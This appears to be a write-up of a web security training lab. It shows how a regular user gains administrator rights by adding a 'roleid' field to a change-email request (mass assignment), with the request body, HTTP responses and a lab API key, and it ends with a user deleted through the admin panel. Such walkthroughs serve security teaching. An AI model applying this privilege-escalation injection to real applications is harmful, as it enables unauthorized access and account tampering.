@@ -1,0 +1,51 @@
+Lab: User role can be modified in user profile
+
+Vulnerability: This lab has an admin panel at /admin. It's only accessible to logged-in users with a roleid of 2.
+
+Goal: Solve the lab by accessing the admin panel and using it to delete the user carlos.
+
+Credentials: wiener:peter
+
+Analysis and Solution: 
+1. Log in with account wiener:peter and access /admin URL
+=> Receive an error: Admin interface only available if logged in as an administrator
+
+2. Send a request to change email address:
+    POST /my-account/change-email 
+    {"email":"a@gmail.com"}
+
+=> In the response: 
+    HTTP/2 302 Found
+    Location: /my-account
+    Content-Type: application/json; charset=utf-8
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 115
+
+    {
+    "username": "wiener",
+    "email": "a@gmail.com",
+    "apikey": "NfnbHHwjx4acXz2BznhGwuB7PqeL0T9y",
+    "roleid": 1
+    }
+=> roleid = 1, so can not access /admin panel 
+=> Try to modify roleid=2
+
+3. Send a request to change email address with body like this: 
+    {"email":"a@gmail.com", "roleid": 2, "apikey": "abc"}
+=> In the response: 
+    HTTP/2 302 Found
+    Location: /my-account
+    Content-Type: application/json; charset=utf-8
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 86
+
+    {
+    "username": "wiener",
+    "email": "a@gamil.com",
+    "apikey": "abc",
+    "roleid": 2
+    }
+=> Now, roleid of this user is 2
+
+4. Access /admin URL and delete carlos
+=> SUCCESSFULLY
